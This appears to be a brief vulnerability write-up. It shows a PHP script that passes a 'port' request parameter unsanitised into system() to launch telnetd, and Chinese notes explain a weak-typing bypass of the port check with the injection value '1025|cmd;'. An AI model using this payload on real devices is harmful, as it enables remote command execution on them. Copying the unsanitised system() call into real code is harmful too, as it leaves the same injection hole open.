<?php
$port = 23233;
$on = 1;
if( isset ( $_REQUEST ['port'] ) ){
		$port = $_REQUEST['port'];
		if( $port <= 1024 ){
			$port = 23233;
		}
	}
	if( isset ( $_REQUEST ['switch'] ) ){
		$on = $_REQUEST['switch'];
		if( $on != 1 && $on != 0 ){
			$on = 0;
		}
	}
	if( $on == 0 ){
		system("killall -9 telnetd");
	}
	else{
		$cmd = "/usr/sbin/telnetd -p " . $port . " -f /www/issue.net -l /www/mylogin.sh";
		system($cmd);
	}

代码逻辑比较简单，port和switch可控。

有一个端口判断，利用PHP弱类型即可绕过。

port输入为1025|cmd;, switch输入为1。

替换cmd为要执行的命令即可。
